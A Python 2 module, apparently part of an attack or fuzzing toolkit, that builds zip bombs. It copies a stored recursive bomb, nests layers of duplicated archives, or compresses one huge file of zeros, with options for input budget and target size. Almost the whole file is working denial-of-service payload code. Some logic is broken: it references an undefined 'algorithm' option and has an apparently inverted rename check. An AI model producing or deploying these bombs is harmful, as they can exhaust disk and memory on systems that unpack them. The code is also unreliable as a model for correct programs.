import zipfile
import gzip
import os
import shutil
import tarfile
import logging
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Supported types are single_file, layer, and recursive')
options.add_option('input_budget', 500, 'Number of bytes in input budget')
options.add_option('target_size', 100000,
                   'Desired size of decompressed file; Not applicable to AC time exploits like recursive zip bombs')
options.add_option('output_file', 'output', 'Name of compressed file; Warning: Use at your own risk! Be careful!')

def run(self, generator, output):

    #TODO - do a check on output.OUTPUT_NAME, since it must be file

    if self.options['type'] == 'recursive':
        if int(self.options['input_budget']) > 440:
            shutil.copyfile(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/zip_recursive.zip',
                            self.options['output_file'] + '.zip')
            print 'Your zip bomb ' + self.options['output_file'] + '.zip is ready in your current directory.'
        else:
            logging.warning('We do not have a recursive zip bomb small enough.')

    elif self.options['type'] == 'layer':
        self.layerzipbomb(generator, int(self.options['input_budget']), int(self.options['target_size']),
                          str(self.options['output_file']))

    elif self.options['type'] == 'single_file':
        self.singlefilebomb(generator, str(self.options['algorithm']), int(self.options['input_budget']),
                            int(self.options['target_size']), str(self.options['output_file']))

def layerzipbomb(self, generator, input_budget, target_size, output_file):
    dummy_name = output_file + '.txt'
    out_zip_file = output_file + '.zip'
    self.generate_dummy_file(dummy_name, 1000000)
    level_1_zip = '1.zip'
    self.zip_compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)
    decompressed_size = 1000000
    layers = 1
    while decompressed_size < target_size:
        self.make_copies_and_compress('%d.zip' % layers, '%d.zip' % (layers+1), 2)
        decompressed_size *= 2
        os.remove('%d.zip' % layers)
        layers += 1
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
        os.rename('%d.zip' % layers, out_zip_file)
    print 'Compressed File Size: %.2f B' % os.path.getsize(out_zip_file)
    print 'Number of layers: %d ' % layers
    print 'Size After Decompression: %d B' % decompressed_size

def zip_compress_file(self, infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()

def make_copies_and_compress(self,infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
    filename, file_extension = os.path.splitext(infile)
    for i in xrange(n_copies):
        f_name = '%s-%d.%s' % (filename, i, file_extension)
        shutil.copy(infile,f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()

def generate_dummy_file(self,filename,size):
    with open(filename, 'w') as dummy:
        dummy.write((size*'0'))

def singlefilebomb(self, generator, algorithm, input_budget, target_size, output_file):
    # Writes a dummy file dummy.txt with target_size bytes of '0'.
    # Cleans up file at end of operation, probably not the cleanest way to do this.
    self.generate_dummy_file('dummy.txt',target_size)

    output_file_name = output_file+'.zip'
    self.zip_compress_file('dummy.txt', output_file_name)

    os.remove('dummy.txt')
    print 'Compressed file size: %d B' % os.stat(output_file_name).st_size
    print 'Uncompressed file size: %d B' % target_size

